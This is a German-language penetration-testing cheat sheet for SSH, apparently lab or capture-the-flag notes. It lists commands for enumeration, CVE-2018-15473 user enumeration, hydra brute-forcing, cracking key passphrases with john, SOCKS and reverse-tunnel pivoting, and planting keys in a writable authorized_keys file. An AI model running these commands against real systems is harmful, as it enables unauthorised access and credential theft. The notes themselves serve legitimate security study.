# 🔑 SSH (22)

## Banner / Version

```bash
nc -nv $RHOST 22
nmap -sV -p22 $RHOST
ssh $RHOST                      # Banner zeigt OS-Hinweis
ssh-audit $RHOST                # Crypto / Algo Check
```

## User-Enum (alte OpenSSH)

```bash
# CVE-2018-15473 (OpenSSH < 7.7)
nmap -p22 --script ssh-auth-methods --script-args="ssh.user=root" $RHOST

# Mit Tool
python3 sshUserEnum.py --port 22 --userList users.txt $RHOST
```

## Auth-Methoden checken

```bash
ssh -v $RHOST                                       # zeigt verfügbare Methoden
nmap -p22 --script ssh-auth-methods $RHOST
```

## Bruteforce

```bash
hydra -L users.txt -P passwords.txt ssh://$RHOST -t 4
hydra -l root -P passwords.txt ssh://$RHOST -t 4

# Mit User-Pass-Combo
hydra -C combo.txt ssh://$RHOST
```

## Mit Private Key

```bash
chmod 600 id_rsa
ssh -i id_rsa user@$RHOST

# Wenn Key passphrase-protected:
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## SSH als Tunnel (für später wichtig!)

```bash
# Local Port Forward (interner Service auf eigenen PC)
ssh -L 8080:127.0.0.1:8080 user@$RHOST

# Dynamic SOCKS Proxy (Pivoting)
ssh -D 1080 user@$RHOST
# Dann mit proxychains: proxychains nmap -sT internal_host

# Remote Port Forward (Reverse)
ssh -R 4444:127.0.0.1:4444 user@$RHOST
```

## Bekannte Probleme

| Issue | Notiz |
|---|---|
| `id_rsa` in Webroot oder Backup | gefundener SSH-Key → direkter Login |
| `.ssh/authorized_keys` writable | eigenen Pubkey reinschreiben |
| weak host key | sshpass + bruteforce |
| SSH-Key-Passphrase | ssh2john + john |
